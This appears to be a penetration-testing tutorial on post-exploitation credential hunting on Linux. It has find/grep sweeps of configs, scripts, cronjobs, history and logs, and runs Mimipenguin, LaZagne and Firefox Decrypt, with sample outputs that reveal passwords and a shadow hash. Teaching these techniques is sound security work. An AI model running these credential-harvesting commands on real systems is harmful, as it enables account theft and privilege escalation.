# Credential Hunting in Linux

## Table of Contents

- [Files](#files)
  - [Configuration files](#configuration-files)
  - [Databases](#databases)
  - [Notes](#notes)
  - [Scripts](#scripts)
  - [Cronjobs](#cronjobs)
- [History: shell history and logs](#history-shell-history-and-logs)
  - [Shell command history](#shell-command-history)
  - [Log files](#log-files)
- [Memory and cache](#memory-and-cache)
  - [Mimipenguin](#mimipenguin)
  - [LaZagne](#lazagne)
- [Browser credentials](#browser-credentials)

---

## Why this matters right after gaining access

The moment you land a shell on a Linux system — say, through a vulnerable web app — one of the fastest paths to privilege escalation is simply **looking around for credentials that are already lying around**. No exploit development, no cracking required if you get lucky. This is often one of the very first things worth trying.

There are four broad places credentials tend to hide:

| Category | Examples |
|----------|-------------|
| **Files** | configs, databases, notes, scripts, cronjobs, SSH keys |
| **History** | logs, shell command history |
| **Memory** | cached credentials, in-memory process data |
| **Keyrings** | browser-saved passwords, OS password managers |

What you'll actually find depends heavily on the **role of the machine**. A standalone, locked-down database server probably won't have normal user accounts or browser history lying around — but a general-purpose workstation or dev box very well might. Keep the system's purpose in mind as you search.

---

## Files

One core Linux principle is that everything is a file. Therefore, systematically search, find, and filter files according to your requirements. Examine these categories individually:

- Configuration files
- Databases
- Notes
- Scripts
- Cronjobs
- SSH keys

### Configuration files

Config files are often where a service's required credentials live in plaintext — database passwords, API keys, service account logins. They typically use `.conf`, `.config`, or `.cnf` extensions (though this isn't guaranteed — the extension can always be customized or omitted).

**Finding all config files by extension:**

```bash
$ for l in .conf .config .cnf; do
    echo -e "\nFile extension: $l"
    find / -name "*$l" 2>/dev/null | grep -v "lib\|fonts\|share\|core"
  done
```

```
File extension: .cnf
/etc/mysql/my.cnf
/etc/mysql/mysql.conf.d/mysqld.cnf
```

**Then search inside them for keywords like "password":**

```bash
$ for i in $(find / -name "*.cnf" 2>/dev/null | grep -v "doc\|lib"); do
    echo -e "\nFile: $i"
    grep "user\|password\|pass" $i 2>/dev/null | grep -v "#"
  done
```

```
File: /etc/mysql/mysql.conf.d/mysqld.cnf
user = mysql
```

### Databases

Same approach, just targeting database file extensions instead:

```bash
$ for l in .sql .db ".*db" ".db*"; do
    echo -e "\nDB File extension: $l"
    find / -name "*$l" 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man"
  done
```
```
DB File extension:  .sql

DB File extension:  .db
/var/cache/dictionaries-common/ispell.db
/var/cache/dictionaries-common/aspell.db
/var/cache/dictionaries-common/wordlist.db
```

This often turns up browser certificate/key databases (`cert9.db`, `key4.db`), app caches, and sometimes actual application databases worth inspecting directly.

### Notes

People leave informal notes about passwords or access points more often than you'd expect — and they're frustratingly inconsistent about naming (not always `.txt`, sometimes no extension at all). Search broadly:

```bash
$ find /home/* -type f -name "*.txt" -o ! -name "*.*"
```

This catches both `.txt` files and files with no extension — covering the more "freeform" places people tend to jot things down.

### Scripts

Automation scripts frequently hardcode credentials — otherwise, the script wouldn't be able to run unattended (e.g., in a cronjob) without someone manually typing a password every time.

```bash
$ for l in .py .pyc .pl .go .jar .c .sh; do
    echo -e "\nFile extension: $l"
    find / -name "*$l" 2>/dev/null | grep -v "doc\|lib\|headers\|share"
  done
```

Worth reading through any scripts found, especially ones owned by service accounts or placed in non-standard locations.

### Cronjobs

**Cron** runs scheduled commands/scripts automatically — and because those jobs run unattended, any required credentials sometimes get hardcoded directly into the job definition (a shortcut, but an insecure one).

Key locations to check:
```
/etc/crontab               (system-wide)
/etc/cron.d/                (Debian-based, per-package jobs)
/etc/cron.hourly/
/etc/cron.daily/
/etc/cron.weekly/
/etc/cron.monthly/
```

```bash
$ cat /etc/crontab
```
```
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
```

```bash
$ ls -la /etc/cron.d/
```

Worth reading through each scheduled job's underlying script for embedded credentials or paths to credential files.
```bash
ls -la /etc/cron.*/
```

---

## History: shell history and logs

### Shell command history

If Bash is the default shell, past commands are stored in `.bash_history` — and people occasionally type passwords directly into the terminal (e.g., as a command-line argument), leaving them sitting in plaintext in their own history file.

Nevertheless, other files like `.bashrc` or `.bash_profile` can contain important information.

```bash
$ tail -n5 /home/*/.bash*
```

```
==> /home/john/.bash_history <==
chmod 755 /tmp/api.py
su
/tmp/api.py john 6mX4UP1eWH3HXK
```

That last line is a script being run with a `username` and what looks suspiciously like a `password` as arguments — a classic example of exactly this mistake.

### Log files

Linux logs system activity across four broad categories: 
- Application logs
- Event logs
- Service logs
- System logs

A few of the most useful ones:

|**File** | **Description**|
|-|-|
|`/var/log/messages` | Generic system activity logs|
|`/var/log/syslog` | Generic system activity logs|
|`/var/log/auth.log` | (Debian) Authentication related logs|
|`/var/log/secure` | (RedHat/CentOS) Authentication related logs|
|`/var/log/boot.log` | Booting information|
|`/var/log/dmesg` | Hardware and drivers information|
|`/var/log/kern.log` | Kernel warnings, errors and logs|
|`/var/log/faillog` | Failed login attempts|
|`/var/log/cron` | Cron jobs information|
|`/var/log/mail.log` | Mail server logs|
|`/var/log/httpd` | Apache logs|
|`/var/log/mysqld.log` | MySQL server logs|

Rather than reading every log manually, a targeted keyword search helps surface anything interesting:

```bash
$ for i in $(ls /var/log/* 2>/dev/null); do
    GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND=\|logs" $i 2>/dev/null)
    if [[ $GREP ]]; then
      echo -e "\n#### Log file: $i"
      grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND=\|logs" $i 2>/dev/null
    fi
  done
```

This flags log entries around authentication events, privilege changes, and sudo command execution — all worth a closer look.

---

## Memory and cache

### Mimipenguin

[Mimipenguin](#https://github.com/huntergregal/mimipenguin) - (Linux's answer to Mimikatz) pulls credentials cached in memory for logged-in users (and sometimes browsers), similar in spirit to how Mimikatz works on Windows. It requires root privileges to run.

```bash
$ sudo python3 mimipenguin.py
```

```
[SYSTEM - GNOME] john:WLpAEXFa0SbqOHY
```

### LaZagne

LaZagne - same tool, broader coverage on Linux (already introduced for Windows) also runs on Linux, and covers an impressive range of sources: WiFi, WPA supplicant configs, Libsecret, KWallet, Chromium-based browsers, shell config/CLI history, Mozilla/Thunderbird, Git credentials, environment variables, GRUB, `/etc/fstab`, AWS credential files, FileZilla, SSH, Apache, the shadow file itself, Docker, KeePass, and more.

```bash
$ sudo python2.7 laZagne.py all
```

```
------------------- Shadow passwords -----------------

[+] Hash found !!!
Login: sambauser
Hash: $6$wgK4tGq7Jepa.V0g$QkxvseL.xkC3jo682xhSGoXXOGcBwPLc2CrAPugD6PYXWQlBkiwwFs7x/fhI.8negiUSPqaWyv7wC8uwsWPrx1:18862:0:99999:7:::

[+] Password found !!!
Login: john
Password: WLpAEXFa0SbqOHY
```

> **About keyrings:** Linux desktop environments often include a built-in password manager (a "keyring") that stores saved passwords encrypted behind a single master password — think of it as the OS-level equivalent of a browser's saved-password feature, just covering more applications at once.

---

## Browser credentials

Browsers encrypt saved logins locally, but that encryption is widely understood and routinely broken by dedicated tools — this is one of the single richest sources of real credentials on any workstation.

### Where Firefox stores them

```bash
$ ls -l .mozilla/firefox/ | grep default
```
```
drwx------ 11 john john 4096 Jan 28 16:02 1bplpd86.default-release
drwx------  2 john john 4096 Jan 28 13:30 lfx3lvhb.default
```

Saved logins live in `logins.json` inside that profile folder:

```bash
$ cat .mozilla/firefox/1bplpd86.default-release/logins.json | jq .
```

```json
{
  "logins": [
    {
      "hostname": "https://www.randomsite.com",
      "encryptedUsername": "MDoEEPgAAAA...",
      "encryptedPassword": "MEIEEPgAAAA..."
    }
  ]
}
```

The credentials are encrypted inside the file — but not unreadable.

### Decrypting with Firefox Decrypt

[Firefox Decrypt](#https://github.com/unode/firefox_decrypt) is a dedicated tool for exactly this:

```bash
$ python3.9 firefox_decrypt.py
```
```
Select the Mozilla profile you wish to decrypt
1 -> lfx3lvhb.default
2 -> 1bplpd86.default-release

2

Website:   https://testing.randomsite.com
Username: 'test'
Password: 'test'

Website:   https://www.randomsite.com
Username: 'john'
Password: 'FzXUxJemKm6g2lGh'
```

Straight to plaintext.

### Or just use LaZagne's browser module

```bash
$ python3 laZagne.py browsers
```

```
[+] Password found !!!
URL: https://testing.randomsite.com
Login: test
Password: test

[+] Password found !!!
URL: https://www.randomsite.com
Login: john
Password: FzXUxJemKm6g2lGh

```

Same result, one tool covering browsers alongside everything else LaZagne already checks.

---

## Quick Recap

| Category | What to check | Useful tools |
|----------|-------------------|------------------|
| Files | Configs, databases, notes, scripts, cronjobs | `find`, `grep` |
| History | `.bash_history`, auth/system logs | `tail`, `grep` |
| Memory | Cached process/login credentials | Mimipenguin, LaZagne |
| Keyrings | Browser saved passwords, OS password managers | Firefox Decrypt, LaZagne |

**Key idea:** On Linux, the "everything is a file" philosophy cuts both ways for security — it means credentials tend to be scattered across configs, scripts, logs, and shell history rather than locked in one protected store, which makes a systematic file-and-keyword sweep across these four categories one of the highest-value, lowest-effort first moves after gaining access to any system.
